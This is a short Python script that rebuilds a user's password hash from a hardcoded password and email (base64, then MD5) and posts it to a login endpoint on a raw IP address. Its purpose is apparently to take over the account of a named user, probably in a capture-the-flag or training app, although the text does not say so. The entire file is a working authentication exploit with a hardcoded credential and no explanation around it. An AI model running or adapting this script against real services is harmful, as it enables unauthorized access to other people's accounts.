import base64
import hashlib
import json

import requests


def encode(string):
    return base64.b64encode(string.encode('utf-8')).decode("utf-8")


email = "Maggie.Simpson@"  # Different domain for login and creating the password hash (oops)
b64 = (encode("H4hgvh5GvG5lkcbo\n") + ":" + encode(email + "googlemail.com\n")).encode('utf-8')
md5 = hashlib.md5(b64).hexdigest()
r = requests.post(
    'http://43.241.202.47:3003/rest/user/login',
    data=json.dumps({
        "email": email + "simpsonmail.com",
        "password": md5,
    }),
    headers={'Content-type': 'application/json;charset=utf-8'},
)

print("Base64 before hashing:", b64)
print("MD5 Hash:", md5)
print("Login status code:", r.status_code)
